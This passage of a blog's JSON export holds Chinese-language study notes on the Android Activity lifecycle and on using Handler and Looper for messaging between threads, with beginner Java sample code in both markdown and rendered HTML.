void onStart() {\n         super.onStart();\n         Log.d(TAG,\"MainActivity onStart  \");\n     }\n     @Override\n     protected void onStop() {\n         super.onStop();\n         Log.d(TAG, \"MainActivity onStop  \");\n     }\n     @Override\n     protected void onDestroy() {\n         super.onDestroy();\n         Log.d(TAG, \"MainActivity onDestroy  \");\n     }\n     @Override\n     protected void onRestart() {\n         super.onRestart();\n         Log.d(TAG, \"MainActivity onRestart  \");\n     }\n }\n```","slug":"android-activity","published":1,"updated":"2017-11-28T03:01:21.549Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscy60019yp0l1k0d62gf","content":"<h3 id=\"函数及解释如下\"><a href=\"#函数及解释如下\" class=\"headerlink\" title=\"函数及解释如下\"></a>函数及解释如下</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onCreate    在activity对象被第一次创建时调用</span><br><span class=\"line\">onStart     在activity变得可见时调用该函数</span><br><span class=\"line\">onResume    在activity开始准备与用户交互时调用该方法</span><br><span class=\"line\">onPause     当系统即将启动另外一个activity之前调用该方法</span><br><span class=\"line\">onStop      当前activity变得不可见时调用该方法</span><br><span class=\"line\">onDestroy   当前activity被销毁之前将会调用该方法</span><br><span class=\"line\">onRestroy   当一个activity再次启动之前将会调用该方法</span><br></pre></td></tr></table></figure>\n<h3 id=\"来张图片帮助理解\"><a href=\"#来张图片帮助理解\" class=\"headerlink\" title=\"来张图片帮助理解\"></a>来张图片帮助理解</h3><a id=\"more\"></a>\n<p><img src=\"http://images2015.cnblogs.com/blog/342595/201511/342595-20151120164811546-1166196919.png\" alt=\"one\"></p>\n<h3 id=\"提供java源代码\"><a href=\"#提供java源代码\" class=\"headerlink\" title=\"提供java源代码\"></a>提供java源代码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.activitytest;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.app.Activity;</span><br><span class=\"line\">import android.content.Intent;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.util.Log;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.view.View.OnClickListener;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends Activity &#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">    private Button btn;</span><br><span class=\"line\">    private static final String TAG = <span class=\"string\">\"ActivityTest\"</span>;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onCreate\"</span>);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\">        btn = (Button)findViewById(R.id.btn);</span><br><span class=\"line\">        btn.setOnClickListener(new <span class=\"function\"><span class=\"title\">OnClickListener</span></span>() &#123;</span><br><span class=\"line\">            </span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void onClick(View v) &#123;</span><br><span class=\"line\">                   Intent intent = new Intent(MainActivity.this,SecondActivity.class);</span><br><span class=\"line\">                   startActivity(intent);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onPause</span></span>() &#123;</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onPause  \"</span>);</span><br><span class=\"line\">        super.onPause();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onResume</span></span>() &#123;</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onResume  \"</span>);</span><br><span class=\"line\">        super.onResume();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onStart</span></span>() &#123;</span><br><span class=\"line\">        super.onStart();</span><br><span class=\"line\">        Log.d(TAG,<span class=\"string\">\"MainActivity onStart  \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onStop</span></span>() &#123;</span><br><span class=\"line\">        super.onStop();</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onStop  \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onDestroy</span></span>() &#123;</span><br><span class=\"line\">        super.onDestroy();</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onDestroy  \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onRestart</span></span>() &#123;</span><br><span class=\"line\">        super.onRestart();</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onRestart  \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","excerpt":"<h3 id=\"函数及解释如下\"><a href=\"#函数及解释如下\" class=\"headerlink\" title=\"函数及解释如下\"></a>函数及解释如下</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onCreate    在activity对象被第一次创建时调用</span><br><span class=\"line\">onStart     在activity变得可见时调用该函数</span><br><span class=\"line\">onResume    在activity开始准备与用户交互时调用该方法</span><br><span class=\"line\">onPause     当系统即将启动另外一个activity之前调用该方法</span><br><span class=\"line\">onStop      当前activity变得不可见时调用该方法</span><br><span class=\"line\">onDestroy   当前activity被销毁之前将会调用该方法</span><br><span class=\"line\">onRestroy   当一个activity再次启动之前将会调用该方法</span><br></pre></td></tr></table></figure>\n<h3 id=\"来张图片帮助理解\"><a href=\"#来张图片帮助理解\" class=\"headerlink\" title=\"来张图片帮助理解\"></a>来张图片帮助理解</h3>","more":"<p><img src=\"http://images2015.cnblogs.com/blog/342595/201511/342595-20151120164811546-1166196919.png\" alt=\"one\"></p>\n<h3 id=\"提供java源代码\"><a href=\"#提供java源代码\" class=\"headerlink\" title=\"提供java源代码\"></a>提供java源代码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.activitytest;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.app.Activity;</span><br><span class=\"line\">import android.content.Intent;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.util.Log;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.view.View.OnClickListener;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends Activity &#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">    private Button btn;</span><br><span class=\"line\">    private static final String TAG = <span class=\"string\">\"ActivityTest\"</span>;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onCreate\"</span>);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\">        btn = (Button)findViewById(R.id.btn);</span><br><span class=\"line\">        btn.setOnClickListener(new <span class=\"function\"><span class=\"title\">OnClickListener</span></span>() &#123;</span><br><span class=\"line\">            </span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void onClick(View v) &#123;</span><br><span class=\"line\">                   Intent intent = new Intent(MainActivity.this,SecondActivity.class);</span><br><span class=\"line\">                   startActivity(intent);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onPause</span></span>() &#123;</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onPause  \"</span>);</span><br><span class=\"line\">        super.onPause();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onResume</span></span>() &#123;</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onResume  \"</span>);</span><br><span class=\"line\">        super.onResume();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onStart</span></span>() &#123;</span><br><span class=\"line\">        super.onStart();</span><br><span class=\"line\">        Log.d(TAG,<span class=\"string\">\"MainActivity onStart  \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onStop</span></span>() &#123;</span><br><span class=\"line\">        super.onStop();</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onStop  \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onDestroy</span></span>() &#123;</span><br><span class=\"line\">        super.onDestroy();</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onDestroy  \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void <span class=\"function\"><span class=\"title\">onRestart</span></span>() &#123;</span><br><span class=\"line\">        super.onRestart();</span><br><span class=\"line\">        Log.d(TAG, <span class=\"string\">\"MainActivity onRestart  \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Android Handler学习记录","date":"2016-06-17T09:18:23.000Z","_content":"\n**这个需要学习三节课程，这是第一节，多的不说，直接放代码**\n\n<!--more-->\n\n### 第一节课程\n\n``` bash\npackage com.example.administrator.handler;\n\nimport android.os.Handler;\nimport android.os.Message;\nimport android.provider.Settings;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    private Handler handler;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button)findViewById(R.id.Button);\n        button.setOnClickListener(new ButtonListener());\n\t\thandler = new FirstHandler();\n    }\n\n    class ButtonListener implements View.OnClickListener{\n        @Override\n        public void onClick(View view){\n            Message message = handler.obtainMessage();\n            message.what = 2;\n            handler.sendMessage(message);\n        }\n    }\n\n    class FirstHandler extends Handler{\n        @Override\n        public void handleMessage(Message message){\n            int what = message.what;\n            System.out.println(\"what = \" + what);\n        }\n    }\n}\n```\n\n**附上参考地址**\nhttps://developer.android.com/reference/android/os/Handler.html\n\n**怎么说呢，上一节课程的代码其实我自己运行失败，主要是java基础还是没过关，不管怎样，先学完了再回头来看是怎么回事，今天来记录第二节课的学习笔记**\n\n### 第二节课程\n\n**主要内容**\n1. 通过Handler实现线程间通信\n2. 在主线程中实现Handler和handleMessage（）方法\n3. 在Worker Thread当中通过Handler发送消息\n\n**今天学得什么我也不太清楚，大概是讲一个worker线程如何通过handler来改变main线程里面的东西，多说不如直接放代码**\n\n``` bash\npackage com.example.administrator.handler2;\n\nimport android.os.Handler;\nimport android.os.Message;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.TextView;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    private TextView textView;\n    private Handler handler;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button)findViewById(R.id.ButtonId);\n        textView = (TextView)findViewById(R.id.TextViewId);\n\n        handler = new MyHandler();\n\n        button.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                Thread thread = new NetWorkThread();\n                thread.start();\n            }\n        });\n    }\n\n    class MyHandler extends Handler {\n        @Override\n        public void handleMessage(Message msg){\n            String s = (String)msg.obj;\n            textView.setText(s);\n        }\n    }\n\n    class NetWorkThread extends Thread{\n        @Override\n        public void run(){\n            try {\n                Thread.sleep(2 * 1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            String s = \"your app is working!\";\n            Message msg = handler.obtainMessage();\n            msg.obj = s;\n            handler.sendMessage(msg);\n        }\n    }\n}\n\n```\n\n**这次运行成功了**\n\n### 第三节课程\n\n**记录之前有个小插曲，之前那个网站的视频到第二节课程就没有了，害得我到处找才找到**\n\n**今天主要内容**\n\n1. 准备Looper对象\n2. 在workerThread当中生成Handler对象\n3. 在MainThread当中发送消息\n\n**先放代码再说问题**\n\n``` bash\npackage com.example.administrator.handler3;\n\nimport android.os.Handler;\nimport android.os.Looper;\nimport android.os.Message;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.TextView;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    private Handler handler;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button)findViewById(R.id.ButtonId);\n        button.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                Message msg = handler.obtainMessage();\n                String s = \"your app is working!\";\n                msg.obj = s;\n                handler.sendMessage(msg);\n            }\n        });\n\n        Thread thread = new MyThread();\n        thread.start();\n    }\n\n    class MyThread extends Thread{\n        public void run(){\n            Looper.prepare();\n            handler = new Handler(){\n                public void handleMessage(Message msg) {\n                    String s = (String)msg.obj;\n                }\n            };\n            Looper.loop();\n        }\n    }\n}\n\n```\n\n**写代码时我将button监听器里面的内容设置成了启动线程，然后再button后面设置handler，结果不能运行，难道是因为那样运行到另外一个线程的时候发现handler还没有设置好。或许是吧，没时间想了，已经一点了，代码发布了就睡**","source":"_posts/android-handler.md","raw":"---\ntitle: Android Handler学习记录\ntags: Android Handler\ndate: 2016-06-17 17:18:23\ncategories: Android\n---\n\n**这个需要学习三节课程，这是第一节，多的不说，直接放代码**\n\n<!--more-->\n\n### 第一节课程\n\n``` bash\npackage com.example.administrator.handler;\n\nimport android.os.Handler;\nimport android.os.Message;\nimport android.provider.Settings;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    private Handler handler;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button)findViewById(R.id.Button);\n        button.setOnClickListener(new ButtonListener());\n\t\thandler = new FirstHandler();\n    }\n\n    class ButtonListener implements View.OnClickListener{\n        @Override\n        public void onClick(View view){\n            Message message = handler.obtainMessage();\n            message.what = 2;\n            handler.sendMessage(message);\n        }\n    }\n\n    class FirstHandler extends Handler{\n        @Override\n        public void handleMessage(Message message){\n            int what = message.what;\n            System.out.println(\"what = \" + what);\n        }\n    }\n}\n```\n\n**附上参考地址**\nhttps://developer.android.com/reference/android/os/Handler.html\n\n**怎么说呢，上一节课程的代码其实我自己运行失败，主要是java基础还是没过关，不管怎样，先学完了再回头来看是怎么回事，今天来记录第二节课的学习笔记**\n\n### 第二节课程\n\n**主要内容**\n1. 通过Handler实现线程间通信\n2. 在主线程中实现Handler和handleMessage（）方法\n3. 在Worker Thread当中通过Handler发送消息\n\n**今天学得什么我也不太清楚，大概是讲一个worker线程如何通过handler来改变main线程里面的东西，多说不如直接放代码**\n\n``` bash\npackage com.example.administrator.handler2;\n\nimport android.os.Handler;\nimport android.os.Message;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.TextView;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    private TextView textView;\n    private Handler handler;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button)findViewById(R.id.ButtonId);\n        textView = (TextView)findViewById(R.id.TextViewId);\n\n        handler = new MyHandler();\n\n        button.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                Thread thread = new NetWorkThread();\n                thread.start();\n            }\n        });\n    }\n\n    class MyHandler extends Handler {\n        @Override\n        public void handleMessage(Message msg){\n            String s = (String)msg.obj;\n            textView.setText(s);\n        }\n    }\n\n    class NetWorkThread extends Thread{\n        @Override\n        public void run(){\n            try {\n                Thread.sleep(2 * 1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            String s = \"your app is working!\";\n            Message msg = handler.obtainMessage();\n            msg.obj = s;\n            handler.sendMessage(msg);\n        }\n    }\n}\n\n```\n\n**这次运行成功了**\n\n### 第三节课程\n\n**记录之前有个小插曲，之前那个网站的视频到第二节课程就没有了，害得我到处找才找到**\n\n**今天主要内容**\n\n1. 准备Looper对象\n2. 在workerThread当中生成Handler对象\n3. 在MainThread当中发送消息\n\n**先放代码再说问题**\n\n``` bash\npackage com.example.administrator.handler3;\n\nimport android.os.Handler;\nimport android.os.Looper;\nimport android.os.Message;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.TextView;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    private Handler handler;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button)findViewById(R.id.ButtonId);\n        button.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                Message msg = handler.obtainMessage();\n                String s = \"your app is working!\";\n                msg.obj = s;\n                handler.sendMessage(msg);\n            }\n        });\n\n        Thread thread = new MyThread();\n        thread.start();\n    }\n\n    class MyThread extends Thread{\n        public void run(){\n            Looper.prepare();\n            handler = new Handler(){\n                public void handleMessage(Message msg) {\n                    String s = (String)msg.obj;\n                }\n            };\n            Looper.loop();\n        }\n    }\n}\n\n```\n\n**写代码时我将button监听器里面的内容设置成了启动线程，然后再button后面设置handler，结果不能运行，难道是因为那样运行到另外一个线程的时候发现handler还没有设置好。或许是吧，没时间想了，已经一点了，代码发布了就睡**","slug":"android-handler","published":1,"updated":"2017-11-28T03:01:39.073Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscy8001dyp0lp5sf903j","content":"<p><strong>这个需要学习三节课程，这是第一节，多的不说，直接放代码</strong></p>\n<a id=\"more\"></a>\n<h3 id=\"第一节课程\"><a href=\"#第一节课程\" class=\"headerlink\" title=\"第一节课程\"></a>第一节课程</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.handler;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.os.Handler;</span><br><span class=\"line\">import android.os.Message;</span><br><span class=\"line\">import android.provider.Settings;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    private Handler handler;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button)findViewById(R.id.Button);</span><br><span class=\"line\">        button.setOnClickListener(new ButtonListener());</span><br><span class=\"line\">\t\thandler = new FirstHandler();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class ButtonListener implements View.OnClickListener&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void onClick(View view)&#123;</span><br><span class=\"line\">            Message message = handler.obtainMessage();</span><br><span class=\"line\">            message.what = 2;</span><br><span class=\"line\">            handler.sendMessage(message);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class FirstHandler extends Handler&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void handleMessage(Message message)&#123;</span><br><span class=\"line\">            int what = message.what;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"what = \"</span> + what);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>附上参考地址</strong><br><a href=\"https://developer.android.com/reference/android/os/Handler.html\" target=\"_blank\" rel=\"external\">https://developer.android.com/reference/android/os/Handler.html</a></p>\n<p><strong>怎么说呢，上一节课程的代码其实我自己运行失败，主要是java基础还是没过关，不管怎样，先学完了再回头来看是怎么回事，今天来记录第二节课的学习笔记</strong></p>\n<h3 id=\"第二节课程\"><a href=\"#第二节课程\" class=\"headerlink\" title=\"第二节课程\"></a>第二节课程</h3><p><strong>主要内容</strong></p>\n<ol>\n<li>通过Handler实现线程间通信</li>\n<li>在主线程中实现Handler和handleMessage（）方法</li>\n<li>在Worker Thread当中通过Handler发送消息</li>\n</ol>\n<p><strong>今天学得什么我也不太清楚，大概是讲一个worker线程如何通过handler来改变main线程里面的东西，多说不如直接放代码</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.handler2;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.os.Handler;</span><br><span class=\"line\">import android.os.Message;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.TextView;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    private TextView textView;</span><br><span class=\"line\">    private Handler handler;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button)findViewById(R.id.ButtonId);</span><br><span class=\"line\">        textView = 